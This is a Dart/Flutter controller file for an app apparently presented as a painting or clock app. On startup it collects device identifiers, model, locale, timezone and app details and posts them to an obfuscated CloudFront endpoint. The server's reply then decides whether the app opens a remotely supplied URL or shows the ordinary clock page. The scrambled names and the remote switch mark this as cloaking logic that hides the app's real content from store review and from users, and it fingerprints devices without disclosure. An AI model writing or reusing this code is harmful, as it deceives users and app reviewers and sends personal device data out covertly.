import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class ArtPaintingGetLogic extends GetxController {

  var mwboryankv = RxBool(false);
  var xtirgafycn = RxBool(true);
  var nxlfo = RxString("");
  var elliot = RxBool(false);
  var jast = RxBool(true);
  final atfdbr = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ekcowyn();
  }


  Future<void> ekcowyn() async {
    elliot.value = true;
    jast.value = true;
    xtirgafycn.value = false;

    atfdbr.post("https://d14hac7du22ssp.cloudfront.net/slyijmugfpdvhekbctowaxzqrn?no_check",data: await gatsrui()).then((value) {
      var hltbcxg = value.data["hltbcxg"] as String;
      var ayjvkl = value.data["ayjvkl"] as bool;
      if (ayjvkl) {
        nxlfo.value = hltbcxg;
        madalyn();
      } else {
        kutch();
      }
    }).catchError((e) {
      xtirgafycn.value = true;
      jast.value = true;
      elliot.value = false;
    });
  }

  Future<Map<String, dynamic>> gatsrui() async {
    final DeviceInfoPlugin mfznudep = DeviceInfoPlugin();
    PackageInfo ojadzrg_jtmzude = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var ntzseijg = Platform.localeName;
    var ovb_yitHVxCw = currentTimeZone;

    var ovb_QeVEWPRb = ojadzrg_jtmzude.packageName;
    var ovb_WRZMCuDV = ojadzrg_jtmzude.version;
    var ovb_KndQ = ojadzrg_jtmzude.buildNumber;

    var ovb_cCkOKmVa = ojadzrg_jtmzude.appName;
    var ovb_ihsOaBdW = "";
    var ovb_oZv  = "";
    var ovb_PwXqB = "";
    var ivyMorar = "";
    var rodgerRutherford = "";
    var fionaHowe = "";
    var nigelQuitzon = "";


    var ovb_vlIYBLU = "";
    var ovb_jnNgtar = false;

    if (GetPlatform.isAndroid) {
      ovb_vlIYBLU = "android";
      var jigcmtu = await mfznudep.androidInfo;

      ovb_PwXqB = jigcmtu.brand;

      ovb_ihsOaBdW  = jigcmtu.model;
      ovb_oZv = jigcmtu.id;

      ovb_jnNgtar = jigcmtu.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ovb_vlIYBLU = "ios";
      var byegzhm = await mfznudep.iosInfo;
      ovb_PwXqB = byegzhm.name;
      ovb_ihsOaBdW = byegzhm.model;

      ovb_oZv = byegzhm.identifierForVendor ?? "";
      ovb_jnNgtar  = byegzhm.isPhysicalDevice;
    }

    var res = {
      "ovb_cCkOKmVa": ovb_cCkOKmVa,
      "ovb_KndQ": ovb_KndQ,
      "ovb_WRZMCuDV": ovb_WRZMCuDV,
      "rodgerRutherford" : rodgerRutherford,
      "ovb_ihsOaBdW": ovb_ihsOaBdW,
      "ovb_yitHVxCw": ovb_yitHVxCw,
      "ovb_PwXqB": ovb_PwXqB,
      "ivyMorar" : ivyMorar,
      "ovb_oZv": ovb_oZv,
      "ntzseijg": ntzseijg,
      "ovb_QeVEWPRb": ovb_QeVEWPRb,
      "ovb_vlIYBLU": ovb_vlIYBLU,
      "ovb_jnNgtar": ovb_jnNgtar,
      "fionaHowe" : fionaHowe,
      "nigelQuitzon" : nigelQuitzon,

    };
    return res;
  }

  Future<void> kutch() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> madalyn() async {
    Get.offNamed("/Outreload");
  }

}
